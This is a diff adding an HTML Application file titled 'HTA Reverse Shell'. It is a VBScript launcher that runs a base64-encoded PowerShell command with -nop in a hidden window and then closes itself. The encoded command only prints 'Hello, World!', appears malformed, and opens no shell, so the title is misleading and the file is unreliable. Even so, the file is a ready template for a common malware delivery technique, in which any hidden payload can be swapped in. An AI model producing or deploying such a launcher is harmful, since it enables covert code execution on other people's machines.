@@ -1,0 +1,21 @@
+<html>
+<head>
+    <title>HTA Reverse Shell</title>
+    <script language="VBScript">
+        On Error Resume Next
+        ' Base64 encoded PowerShell command to display "Hello, World!"
+        Dim base64Command
+        base64Command = "aQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBNAGEAcgBzAGgAYQBsACkALgBDAG8AbgBzAG8AbABlAFcAcgBpAHQAZQAoACIASABlAGwAbABvACwAIABXAG8AcgBsAGQAIQAiACkA"
+
+        ' Use WScript.Shell to run the PowerShell command
+        Set objShell = CreateObject("WScript.Shell")
+        objShell.Run "powershell.exe -nop -encodedCommand " & base64Command, 0
+        Set objShell = Nothing
+
+        ' Close the HTA after execution
+        self.close
+    </script>
+</head>
+<body>
+</body>
+</html>
